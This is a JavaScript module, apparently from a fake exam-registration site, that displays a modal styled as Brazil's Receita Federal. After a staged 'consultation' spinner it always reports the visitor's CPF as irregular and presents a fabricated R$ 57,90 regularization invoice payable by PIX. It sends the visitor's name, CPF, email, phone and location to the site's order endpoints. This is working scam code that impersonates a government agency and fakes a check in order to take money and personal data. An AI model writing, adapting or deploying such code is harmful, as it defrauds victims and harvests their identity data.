(function () {
  if (window.__cpfReceitaReady) return;
  window.__cpfReceitaReady = true;

  function el(html) {
    const wrap = document.createElement('div');
    wrap.innerHTML = html.trim();
    return wrap.firstElementChild;
  }

  function dadosCpf() {
    try { return JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}'); } catch (e) { return {}; }
  }

  function formatCpf(value) {
    const digits = String(value || '').replace(/\D/g, '');
    if (digits.length !== 11) return digits || '—';
    return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  }

  function vencimento() {
    const date = new Date();
    date.setDate(date.getDate() + 2);
    return date.toLocaleDateString('pt-BR');
  }

  function extraPedido() {
    if (typeof dadosDoPedido === 'function') {
      const dados = dadosDoPedido();
      return {
        nome: dados.nome || dadosCpf().nome || '',
        cpf: dados.cpf || dadosCpf().cpf || '',
        email: dados.email || localStorage.getItem('emailUsuario') || '',
        telefone: dados.telefone || localStorage.getItem('telefoneUsuario') || '',
        cargo: dados.cargo || '',
        cep: dados.cep || '',
        cidade: dados.cidade || '',
        uf: dados.uf || '',
        utm: dados.utm || window.aventadorUtms || {}
      };
    }
    return {
      nome: dadosCpf().nome || '',
      cpf: dadosCpf().cpf || '',
      email: localStorage.getItem('emailUsuario') || '',
      telefone: localStorage.getItem('telefoneUsuario') || '',
      cargo: '',
      cep: localStorage.getItem('cep') || '',
      cidade: '',
      uf: '',
      utm: window.aventadorUtms || {}
    };
  }

  let modal = null;

  function ensureModal() {
    if (modal) return modal;
    if (!document.body) return null;

    if (!document.getElementById('cpf-receita-css')) {
      const style = document.createElement('style');
      style.id = 'cpf-receita-css';
      style.textContent = `
        #modal-cpf-receita{position:fixed;inset:0;z-index:80;display:none}
        #modal-cpf-receita.is-open{display:block}
        #modal-cpf-receita .cpf-receita-bg{position:absolute;inset:0;background:rgba(0,0,0,.6)}
        #modal-cpf-receita .cpf-receita-scroll{position:relative;height:100%;overflow-y:auto;padding:16px;display:flex;align-items:flex-start;justify-content:center}
        #modal-cpf-receita .cpf-receita-card{background:#fff;width:100%;max-width:32rem;border-radius:12px;box-shadow:0 25px 50px -12px rgba(0,0,0,.25);margin:32px 0;overflow:hidden}
        #modal-cpf-receita .cpf-receita-head{background:#1351B4;color:#fff;padding:16px 20px}
        #modal-cpf-receita .cpf-receita-kicker{font-size:11px;letter-spacing:.16em;font-weight:700;text-transform:uppercase;opacity:.9}
        #modal-cpf-receita .cpf-receita-title{font-size:18px;font-weight:600}
        #modal-cpf-receita .cpf-receita-body{padding:20px}
        #modal-cpf-receita .cpf-btn{width:100%;border:0;border-radius:8px;padding:12px 16px;font-weight:700;cursor:pointer;font-size:16px}
        #modal-cpf-receita .cpf-btn-blue{background:#1351B4;color:#fff}
        #modal-cpf-receita .cpf-btn-green{background:#16a34a;color:#fff}
        #modal-cpf-receita .cpf-alert{display:flex;gap:12px;padding:16px;border-radius:8px;border:1px solid #fecaca;background:#fef2f2;margin-bottom:20px}
        #modal-cpf-receita .cpf-invoice{border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;margin-bottom:20px}
        #modal-cpf-receita .cpf-invoice-head{background:#f3f4f6;padding:8px 16px;font-size:11px;font-weight:700;letter-spacing:.16em;color:#4b5563;text-transform:uppercase}
        #modal-cpf-receita .cpf-row{display:flex;justify-content:space-between;gap:12px;font-size:14px;padding:4px 0}
        #modal-cpf-receita .cpf-muted{color:#6b7280}
        #modal-cpf-receita textarea{width:100%;height:96px;font-size:12px;font-family:ui-monospace,Menlo,monospace;background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;padding:12px;margin-bottom:12px}
      `;
      document.head.appendChild(style);
    }

    modal = el(`
      <div id="modal-cpf-receita">
        <div class="cpf-receita-bg"></div>
        <div class="cpf-receita-scroll">
          <div class="cpf-receita-card">
            <div class="cpf-receita-head">
              <div class="cpf-receita-kicker">Receita Federal do Brasil</div>
              <div class="cpf-receita-title">Regularidade cadastral do CPF</div>
            </div>
            <div class="cpf-receita-body" id="cpf-receita-body"></div>
          </div>
        </div>
      </div>
    `);
    document.body.appendChild(modal);
    return modal;
  }

  function showStep(html) {
    const root = ensureModal();
    if (!root) return;
    root.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    document.getElementById('cpf-receita-body').innerHTML = html;
  }

  function stepAviso() {
    const cpf = formatCpf(dadosCpf().cpf);
    const nome = dadosCpf().nome || 'Candidato';
    showStep(`
      <div style="text-align:center">
        <div style="margin:0 auto 16px;width:64px;height:64px;border-radius:9999px;background:#fef9c3;display:flex;align-items:center;justify-content:center">
          <i class="fas fa-exclamation-triangle" style="color:#ca8a04;font-size:24px"></i>
        </div>
        <h3 style="font-size:20px;font-weight:700;color:#1f2937;margin:0 0 8px">Atenção, ${nome.split(' ')[0]}</h3>
        <p style="color:#374151;line-height:1.6;margin:0 0 16px">
          Seu CPF deve estar <strong>regular na Receita Federal</strong> no dia da prova.
          Sem essa regularidade, a inscrição pode ser indeferida.
        </p>
        <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;padding:12px;font-size:14px;color:#4b5563;margin-bottom:20px">
          CPF informado: <strong style="color:#1f2937">${cpf}</strong>
        </div>
        <button id="btn-verificar-cpf" class="cpf-btn cpf-btn-blue">Verificar meu CPF</button>
      </div>
    `);
    document.getElementById('btn-verificar-cpf').addEventListener('click', verificarCpf);
  }

  function verificarCpf() {
    showStep(`
      <div style="text-align:center;padding:32px 0">
        <div class="animate-spin" style="width:48px;height:48px;border-radius:9999px;border-bottom:2px solid #1351B4;margin:0 auto 16px"></div>
        <p style="font-weight:600;color:#1f2937;margin:0">Consultando a Receita Federal...</p>
        <p style="font-size:14px;color:#6b7280;margin:8px 0 0">Validando situação cadastral do CPF</p>
      </div>
    `);
    setTimeout(stepIrregular, 1800);
  }

  function stepIrregular() {
    const cpf = formatCpf(dadosCpf().cpf);
    const nome = dadosCpf().nome || 'Não informado';
    showStep(`
      <div>
        <div class="cpf-alert">
          <i class="fas fa-times-circle" style="color:#dc2626;font-size:20px;margin-top:2px"></i>
          <div>
            <div style="font-weight:700;color:#991b1b">CPF irregular</div>
            <p style="font-size:14px;color:#b91c1c;margin:4px 0 0">A situação cadastral na Receita Federal está irregular. Regularize antes do dia da prova.</p>
          </div>
        </div>
        <div class="cpf-invoice">
          <div class="cpf-invoice-head">Fatura · Receita Federal</div>
          <div style="padding:16px">
            <div class="cpf-row"><span class="cpf-muted">Contribuinte</span><span style="font-weight:500;color:#1f2937">${nome}</span></div>
            <div class="cpf-row"><span class="cpf-muted">CPF</span><span style="font-weight:500;color:#1f2937">${cpf}</span></div>
            <div class="cpf-row"><span class="cpf-muted">Descrição</span><span style="font-weight:500;color:#1f2937">Regularização cadastral de CPF</span></div>
            <div class="cpf-row"><span class="cpf-muted">Vencimento</span><span style="font-weight:500;color:#1f2937">${vencimento()}</span></div>
            <div class="cpf-row" style="align-items:flex-end;padding-top:12px;margin-top:8px;border-top:1px solid #e5e7eb">
              <span class="cpf-muted">Valor</span>
              <span style="font-size:24px;font-weight:700;color:#111827">R$ 57,90</span>
            </div>
          </div>
        </div>
        <button id="btn-pagar-receita" class="cpf-btn cpf-btn-green">Pagar</button>
      </div>
    `);
    document.getElementById('btn-pagar-receita').addEventListener('click', gerarPixReceita);
  }

  function renderQr(container, emv) {
    const encoded = encodeURIComponent(emv);
    container.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encoded}" alt="QR Code PIX" style="width:220px;height:220px;margin:0 auto;display:block">`;
  }

  function gerarPixReceita() {
    showStep(`
      <div style="text-align:center;padding:32px 0">
        <div class="animate-spin" style="width:48px;height:48px;border-radius:9999px;border-bottom:2px solid #16a34a;margin:0 auto 16px"></div>
        <p style="font-weight:600;color:#1f2937;margin:0">Gerando PIX da fatura...</p>
      </div>
    `);
    const extra = extraPedido();
    fetch('/selecao/api/gerar-pix.php?price_cents=5790', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        nome_pagador: extra.nome,
        cpf_pagador: extra.cpf,
        email_pagador: extra.email,
        telefone_pagador: extra.telefone,
        cargo: extra.cargo || '',
        cep: extra.cep || '',
        cidade: extra.cidade || '',
        uf: extra.uf || '',
        produto: 'Regularizacao CPF - Receita Federal',
        price_cents: 5790,
        utm: extra.utm || {}
      })
    })
      .then((res) => res.json())
      .then((res) => {
        const pixCode = res.pixCode || res.qrcode;
        const transacaoId = res.transacao_id || res.external_id;
        if (!res.success || !pixCode || !transacaoId) {
          throw new Error(res.error || 'Não foi possível gerar o PIX');
        }
        localStorage.setItem('pixcodereceita', pixCode);
        localStorage.setItem('pixtxidreceita', transacaoId);
        fetch('/selecao/api/order-sync.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            transacao_id: transacaoId,
            status: 'waiting_payment',
            nome: extra.nome,
            cpf: extra.cpf,
            email: extra.email,
            telefone: extra.telefone,
            cargo: extra.cargo || '',
            cep: extra.cep || '',
            cidade: extra.cidade || '',
            uf: extra.uf || '',
            produto: 'Regularizacao CPF - Receita Federal',
            price_cents: 5790,
            utm: extra.utm || {}
          })
        }).catch(function () {});
        stepPix(pixCode, transacaoId, extra);
      })
      .catch((err) => {
        showStep(`
          <div style="text-align:center">
            <p style="color:#b91c1c;font-weight:600;margin:0 0 16px">${err.message || 'Erro ao gerar o PIX'}</p>
            <button id="btn-pagar-receita-retry" class="cpf-btn cpf-btn-green">Tentar novamente</button>
          </div>
        `);
        document.getElementById('btn-pagar-receita-retry').addEventListener('click', gerarPixReceita);
      });
  }

  function stepPix(pixCode, transacaoId, extra) {
    showStep(`
      <div>
        <div style="text-align:center;margin-bottom:16px">
          <div class="cpf-receita-kicker" style="color:#6b7280;margin-bottom:4px">PIX · Receita Federal</div>
          <div style="font-size:24px;font-weight:700;color:#111827">R$ 57,90</div>
          <p style="font-size:14px;color:#4b5563;margin:4px 0 0">Regularização cadastral de CPF</p>
        </div>
        <div id="qr-receita" style="display:flex;justify-content:center;margin-bottom:16px"></div>
        <textarea id="pix-code-receita" readonly>${pixCode}</textarea>
        <button id="copy-pix-receita" class="cpf-btn cpf-btn-blue" style="margin-bottom:12px">Copiar código PIX</button>
        <div id="status-pix-receita" style="display:flex;align-items:center;padding:12px;background:#fefce8;border:1px solid #fde68a;border-radius:8px;font-size:14px;color:#854d0e">
          <div class="animate-spin" style="width:16px;height:16px;border-radius:9999px;border-bottom:2px solid #ca8a04;margin-right:8px"></div>
          Aguardando pagamento da fatura...
        </div>
      </div>
    `);
    renderQr(document.getElementById('qr-receita'), pixCode);
    document.getElementById('copy-pix-receita').addEventListener('click', function () {
      const area = document.getElementById('pix-code-receita');
      area.select();
      document.execCommand('copy');
      this.textContent = 'Código copiado';
    });
    const poll = setInterval(function () {
      fetch('/selecao/api/status-pix.php?id=' + encodeURIComponent(transacaoId))
        .then((r) => r.json())
        .then((data) => {
          const st = String(data.status || '').toUpperCase();
          if ((data.success || data.ok) && (st === 'APPROVED' || st === 'PAID')) {
            clearInterval(poll);
            const statusEl = document.getElementById('status-pix-receita');
            statusEl.innerHTML = '<i class="fas fa-check-circle" style="color:#15803d;margin-right:8px"></i><span style="color:#166534">Pagamento da fatura confirmado.</span>';
            statusEl.style.background = '#f0fdf4';
            statusEl.style.borderColor = '#bbf7d0';
            fetch('/selecao/api/order-sync.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                transacao_id: transacaoId,
                status: 'paid',
                nome: extra && extra.nome,
                cpf: extra && extra.cpf,
                email: extra && extra.email,
                telefone: extra && extra.telefone,
                produto: 'Regularizacao CPF - Receita Federal',
                price_cents: 5790
              })
            }).catch(function () {});
            localStorage.setItem('cpfReceitaPago', '1');
            setTimeout(stepPago, 1200);
          }
        })
        .catch(function () {});
    }, 3000);
  }

  function stepPago() {
    showStep(`
      <div style="text-align:center;padding:16px 0">
        <div style="margin:0 auto 16px;width:64px;height:64px;border-radius:9999px;background:#dcfce7;display:flex;align-items:center;justify-content:center">
          <i class="fas fa-check" style="color:#16a34a;font-size:24px"></i>
        </div>
        <h3 style="font-size:20px;font-weight:700;color:#1f2937;margin:0 0 8px">Fatura quitada</h3>
        <p style="color:#4b5563;margin:0">A regularização do CPF foi registrada. Guarde o comprovante para o dia da prova.</p>
      </div>
    `);
  }

  function abrir() {
    if (!document.body) {
      document.addEventListener('DOMContentLoaded', abrir);
      return;
    }
    if (localStorage.getItem('cpfReceitaPago') === '1') {
      stepPago();
      return;
    }
    stepAviso();
  }

  window.abrirModalCpfReceita = abrir;
})();
